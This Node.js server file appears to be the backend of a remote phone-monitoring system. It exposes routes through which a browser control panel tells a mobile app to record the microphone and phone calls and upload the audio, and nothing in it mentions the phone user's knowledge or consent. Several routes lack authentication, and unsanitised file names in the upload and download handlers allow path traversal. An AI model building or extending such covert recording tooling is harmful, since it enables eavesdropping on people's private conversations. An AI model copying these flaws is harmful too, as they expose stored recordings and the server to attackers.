require('rootpath')();

const path = require('path');
const errcode = require('err-code');
const multer = require('multer');
const mkdirp = require('mkdirp');
const requireLogin = require('middlewares/require_login');

async function postRecord(req, res, next) {
    const id = String(req.body.id);
    const action = String(req.body.action);

    const app = req.app;

    const { Mobile } = app.db;
    const mobile = await Mobile.findByPk(id);
    if (!mobile)
        return next(errcode(new Error('not found'), { status: 404 }));;

    const socket = app.socket;
    const mobileSocket = socket.getMobileMain(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not found'), { status: 404 }));

    socket.io.to(room).emit('mic_record', {
        rid: "1",
        duration: 14,
        action,
    });
    res.json({ id: mobile.id });
}

async function postCallRecord(req, res, next) {
    const id = String(req.body.id);

    const app = req.app;

    const { Mobile } = app.db;
    const mobile = await Mobile.findByPk(id);
    if (!mobile)
        return next(errcode(new Error('not found'), { status: 404 }));;

    const socket = app.socket;
    const mobileSocket = socket.getMobileMain(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not found'), { status: 404 }));
    socket.io.to(room).emit('call_record', { file_path: mobile.filePath });
    res.json({ id: mobile.id });
}

async function postEnableRecord(req, res, next) {
    const id = String(req.body.id);

    const app = req.app;

    const { Mobile } = app.db;
    const mobile = await Mobile.findByPk(id);
    if (!mobile)
        return next(errcode(new Error('not found'), { status: 404 }));;

    const socket = app.socket;
    const mobileSocket = socket.getMobileMain(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not found'), { status: 404 }));
    socket.io.to(room).emit('enable_record', { file_path: mobile.filePath });
    res.json({ id: mobile.id });
}

function saveRecordingFiles() {
    const storage = multer.diskStorage({
        destination(req, file, cb) {
            const mobileId = String(req.body.id);
            if (mobileId == null)
                return cb(errcode(new Error('mobile id is required'), { status: 400 }));

            const dir = path.join(req.app.get('record.mobiles.dir'), mobileId);
            mkdirp.sync(dir);
            cb(null, dir);
        },
        async filename(req, file, cb) {
            const mobileId = String(req.body.id);
            const { Mobile } = req.app.db;
            const mobile = await Mobile.findByPk(mobileId);
            const file_name = (mobile.name == "") ? `${mobile.number}_${req.body.fileName}` : `${mobile.name}_${mobile.number}_${req.body.fileName}`;
            return cb(null, file_name)
        }
    });
    const upload = multer({
        storage,
        fileFilter(req, file, cb) {
            cb(null, true);
        }
    }).any();

    return (req, res, next) => {
        upload(req, res, err => {
            if (err)
                req.app.logger.error(err);
            next(err);
        });
    }
}

async function getRecord(req, res, next) {
    const mobileId = String(req.body.id);
    res.json({ id: mobileId });
    const { Mobile } = req.app.db;
    const mobile = await Mobile.findByPk(mobileId);
    if (!!mobile) {
        const file_name = (mobile.name == "") ? `${mobile.number}_${req.body.fileName}` : `${mobile.name}_${mobile.number}_${req.body.fileName}`;
        const app_id = mobile.appId;
        req.app.socket.io.to('controls').emit('record_updated', { id: mobileId, app_id, file_name });
    }
}

async function downloadFile(req, res) {
    const mobileId = String(req.params.mobile);
    const file_name = String(req.params.file_name);
    const dir_name = path.join(req.app.get('record.mobiles.dir'), mobileId);
    res.download(path.join(dir_name, file_name));
}

async function getRecordings(req, res, next) {
    let { offset, limit, mobile_id } = req.query;
    const appId = req.session.app_id;

    if (offset != null)
        offset = Number(offset);
    if (limit != null)
        limit = Number(limit);
    let where = { appId: appId };
    if (mobile_id) {
        where = {
            ...where,
            mobileId: mobile_id
        }
    }
    const { Recording, Mobile } = req.app.db;

    const recordings = await Recording.findAndCountAll({
        where,
        offset,
        limit,
        include: [Mobile],
        order: [
            ['id', 'DESC']
        ]
    });

    res.json({
        items: recordings.rows.map(recording => ({
            id: recording.id,
            mobile_id: recording.mobile ? recording.mobile.id : '',
            mobile_number: recording.mobile ? recording.mobile.number : '',
            duration: recording.duration,
            file_name: recording.fileName,
            social: recording.social,
            updated_at: recording.updatedAt,
            status: recording.status,
        })),
        total: recordings.count,
    });
}

async function addRecording(req, res, next) {
    const mobileId = String(req.body.mobile_id);
    const duration = Number(req.body.duration);

    const appId = req.session.app_id;

    const app = req.app;
    const { Recording, Mobile } = app.db;

    const exist_recording = await Recording.findOne({ where: { mobileId, status: 0 } });
    if (exist_recording) {
        return res.json({ msg: "action is exist!" });
    }
    const recording = await Recording.create({ mobileId, appId, duration, fileName: '', status: 0 });

    const mobile = await Mobile.findByPk(mobileId);
    if (!mobile)
        return next(errcode(new Error('not mobile found'), { status: 404 }));;

    const socket = app.socket;
    const mobileSocket = socket.getMobileMain(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not socket found'), { status: 404 }));

    socket.io.to(room).emit('mic_record_duration', { duration });

    res.json({ id: recording.id });
}

async function deleteRecording(req, res) {
    await req.recording.destroy();
    res.json({});
}

async function getRecordDuration(req, res, next) {
    const mobileId = String(req.body.id);
    const { Mobile, Recording } = req.app.db;
    const mobile = await Mobile.findByPk(mobileId);

    if (!!mobile) {
        const file_name = (mobile.name == "") ? `${mobile.number}_${req.body.fileName}` : `${mobile.name}_${mobile.number}_${req.body.fileName}`;
        const exist_recording = await Recording.findOne({ where: { mobileId, status: 0 } });
        if (!!exist_recording)
            exist_recording.update({ fileName: file_name, status: 1 });

        const app_id = mobile.appId;

        req.app.socket.io.to('controls').emit('record_updated', { id: mobileId, app_id, file_name });
    }

    res.json({ id: mobileId });
}

module.exports = app => {
    app.set('record.mobiles.dir', path.join(app.get('record.dir'), 'mobiles'));

    //
    //  Recording Action
    //
    // +-----------+                              +--------+                                   +--------+
    // |           | POST /api/mobile/mic_record  |        |     socket.io mic_record              |        |
    // |           +----------------------------->|        +---------------------------------->|        |
    // |  Control  |                              | Server |    POST /api/mobile/recording     | Mobile |
    // | (Browser) |  socket.io record_updated    | (Node) |<--------------------------------- |  (App) |
    // |           |<---------------------------- |        |                                   |        |
    // +-----------+                              +--------+                                   +--------+
    //

    app.api.route('/mobile/mic_record').post(postRecord);

    // +-----------+                               +--------+                                        +--------+
    // |           | POST /api/mobile/call_record  |        |     socket.io call_record              |        |
    // |           +------------------------------>|        +--------------------------------------->|        |
    // |  Control  |                               | Server |      POST /api/mobile/recording        | Mobile |
    // | (Browser) | socket.io record_updated      | (Node) |<-------------------------------------- |  (App) |
    // |           |<----------------------------- |        |                                        |        |
    // +-----------+                               +--------+                                        +--------+
    //
    app.api.route('/mobile/call_record').post(postCallRecord);

    app.api.route('/mobile/recording').post(saveRecordingFiles(), getRecord);

    app.api.route('/mobile/enable_record').post(postEnableRecord);

    app.api.route('/mobiles/:mobile/:file_name/record_file').get(downloadFile);

    // +-----------+                               +--------+                                        +--------+
    // |           |       POST /api/recording     |        |     socket.io mic_record_duration      |        |
    // |           +------------------------------>|        +--------------------------------------->|        |
    // |  Control  |                               | Server |   POST /api/mobile/recording_duration  | Mobile |
    // | (Browser) | socket.io record_updated      | (Node) |<-------------------------------------- |  (App) |
    // |           |<----------------------------- |        |                                        |        |
    // +-----------+                               +--------+                                        +--------+
    //

    app.api.route('/recording')
        .get(requireLogin(), getRecordings)
        .post(requireLogin(), addRecording)

    app.api.route('/recording/:recording')
        .delete(deleteRecording);

    app.api.route('/mobile/recording_duration').post(saveRecordingFiles(), getRecordDuration);

};